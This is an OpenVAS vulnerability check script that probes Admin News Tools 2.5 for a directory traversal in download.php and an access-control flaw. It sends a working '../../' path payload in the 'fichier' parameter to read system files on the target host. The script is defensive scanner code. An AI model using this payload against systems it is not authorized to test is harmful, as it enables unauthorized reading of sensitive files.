###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_admin_news_tools_mult_vuln_jul09.nasl 14031 2019-03-07 10:47:29Z cfischer $
#
# Admin News Tools Multiple Vulnerabilities
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:adminnewstools:admin_news_tools";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900905");
  script_version("$Revision: 14031 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-07 11:47:29 +0100 (Thu, 07 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-07-31 07:37:13 +0200 (Fri, 31 Jul 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-2557", "CVE-2009-2558");
  script_name("Admin News Tools Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_admin_news_tools_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("ANT/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass security
  restrictions by gaining sensitive information and redirect the user to other malicious sites.");

  script_tag(name:"affected", value:"Admin News Tools version 2.5.");

  script_tag(name:"insight", value:"- Input passed via the 'fichier' parameter in 'system/download.php' is not
  properly verified before being processed and can be used to read arbitrary files via a .. (dot dot) sequence.

  - Access to system/message.php is not restricted properly and can be
  exploited to post news messages by accessing the script directly.");

  script_tag(name:"solution", value:"Upgrade to Admin News Tools version 3.0 or later.");

  script_tag(name:"summary", value:"This host is installed with Admin News Tools and is prone to
  multiple vulnerabilities.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/35842");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9161");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9153");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/51780");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.adminnewstools.fr.nf/");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if(dir == "/")
  dir = "";

if(host_runs("windows") == "yes") {
  files = traversal_files("windows");
  foreach file ( keys( files ) ) {
    url = dir + "/news/system/download.php?fichier=./../../../../../" + files[file];
    if( http_vuln_check( port:port, url:url, pattern:file  ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
} else {
  files = traversal_files("linux");
  foreach file ( keys( files ) ) {
    url = dir + "/news/system/download.php?fichier=../../../../../../" + files[file];
    if( http_vuln_check( port:port, url:url, pattern:file  ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );